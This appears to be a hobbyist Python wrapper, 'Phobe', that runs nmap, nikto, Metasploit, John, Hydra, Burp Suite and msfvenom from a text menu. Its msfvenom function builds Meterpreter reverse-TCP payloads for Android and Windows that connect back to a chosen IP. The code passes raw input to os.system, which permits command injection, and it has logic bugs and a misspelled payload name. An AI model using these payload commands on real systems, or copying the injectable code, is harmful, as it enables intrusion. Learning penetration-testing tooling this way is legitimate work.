from .hydra_brute import hydra_brute_force

from .john import john_crack
from platform import system
import os
import subprocess
import sys
import pyfiglet




# banner
banner = pyfiglet.figlet_format("Phobe")
print(banner)


# function for nmapping target

def nmap_scaning():
    # input for user for target 
    target_input = input("enter target ip address")

    # scanning for open ports
    print("""
    menu: 
        1. scan for open port 
        2. do an aggressive scan on the target
        3. verify operating system of the target machine
        4. run vulnerablity scanning scripts against target machine
    """)
    # input for user to select from menu
    selection = input("select from above menu")

    if selection == "1":
        os.system(f"nmap {target_input}")
    elif selection == "2":
        os.system(f"nmap -A {target_input}")
    elif selection == "3":
        os.system(f"nmap -O {target_input}")
    elif selection == "4":
        if system() == "linux":
            location  = "/usr/share/nmap/scripts"
            # os.system(f"nmap --script vuln {target_input}")
        elif system() == "Windows":
            # location = "C:\Program Files (x86)\Nmap\scripts"
            os.system(f"nmap --scripts vuln {target_input}")
    

def nikto():
    """
    nikto is a vulnerability scanner to scan web servers for vulnerability
    """
    target = input("Enter the target ip")
    os.system(f"nikto -h {target}")

    file_name = input("Enter the file name to be saved")
    file_format = input("Which type to file output do you want ? ")
    if file_name == "No":
        file_format = False
    else:
        if file_format == ".txt" or "txt":
          os.system(f"nikto -h {target} -o {file_name} -Format txt")
        elif file_format == ".csv" or "csv":
              os.system(f"nikto -h {target} -o {file_name} -Format csv")
    # add more option to save file in different format

    # check if the target has ssl enabled
    ssl = input("Does target have ssl ?[Y/N] ")
    if ssl == "Yes" or "Y":
        os.system(f"nikto -h {target} -ssl")
    elif ssl == "No" or "N":
        os.system(f"nikto -h {target}")
    # pair msfconsole with nikto 
    msf  = input("Do you to open msfconsole with nikto ?[Y/N]")
    if msf == "Y":
        os.system(f"nikto -h {target} -Format msf+")

# function to start metaspolit framework
def metaspolit():
    os.system(f" msfconsole.bat")

# function for msfvenom to create payload
def msfvenom():
    print("The name of the file generated will be payload.") 
    ip = input("Enter your ip addr") 
    port = input("which port for listening")
    payload_type = input("type of payload ? ")
    platform = input("Which platform")
    if payload_type == "reverse shell":
        if platform == "android":
            os.system(f"sudo msfvenom -p android/meterpreter/reverse_tcp lhost={ip} lport={port} R > payload.apk")
        elif platform == "Windows":
            os.system(f"sudo msfvenom -p windwos/meterpreter/reverse_tcp lhost={ip} lport={port} -f exe > payload.exe ")

# function to start burpsuite
def burpsuite():
    print("Starting the burpsuite community edition!")
    os.system("burpsuite &")


def main():
    print("Type 'list' to show all the possible commands you can give !")
    # main function to call at the end 
    console = input("phobe/>")
    if console == "list":
        print("""
            Menu : 
        1. Nmap the target machine
        2. do a nikto scan on target machine
        3. start metaspolit framework
        4. crack hashes with john
        5. brute-force with hydra
        6. start burpsuite 
        7. create a payload with msfvenom done!
    """)
        main()
    # getting main user inputs 
    elif console == "1":
        nmap_scaning()
        main()
    elif console == "2":
        nikto()
        main()
    elif console == "3":
        metaspolit()
        main()
    elif console == "4":
        john_crack()
        main()
    elif console == "5":
        hydra_brute_force()
        main()
    elif console == "6":
        burpsuite()
        main()
    elif console == "7":
        msfvenom()
        main()



            


        
if __name__ == "__main__":
    main()